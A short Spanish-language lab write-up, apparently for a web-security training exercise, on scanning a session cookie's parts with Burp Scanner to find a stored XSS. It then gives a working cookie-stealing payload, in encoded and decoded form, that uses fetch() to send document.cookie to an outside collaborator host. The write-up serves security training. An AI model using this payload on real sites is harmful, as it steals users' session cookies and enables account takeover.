---
title: "2 - Scanning non-standard data structures"
---

# 2 - Scanning non-standard data structures

En la cookie hay que seleccionar wiener y lanzarle un escaneo y lo mismo con  `3aASUfimfLKdHOnwtTUN5b0hUiZIvxQzjH` 

```HTTP
Cookie: session=wiener%3aASUfimfLKdHOnwtTUN5b0hUiZIvxQzjH;
```

Nos encontrará un stored XSS , se ha encontrado porque parece ser que alguien ejecutó el XSS escondido y lanzó una petición al collaborator.

Introducimos un payload para robar la cookie :

```HTTP
Cookie: session='%22%3e%3csvg%2fonload%3dfetch(%60%2f%2fmoevjmpvk74i1dc4cofpvfkxfolj9nxc.oastify.com%2f%24%7bencodeURIComponent(document.cookie)%7d%60)%3e%3aASUfimfLKdHOnwtTUN5b0hUiZIvxQzjH;
```

```HTML
Cookie: session='"><svg/onload=fetch(`//moevjmpvk74i1dc4cofpvfkxfolj9nxc.oastify.com/${encodeURIComponent(document.cookie)}`)>:ASUfimfLKdHOnwtTUN5b0hUiZIvxQzjH;
```
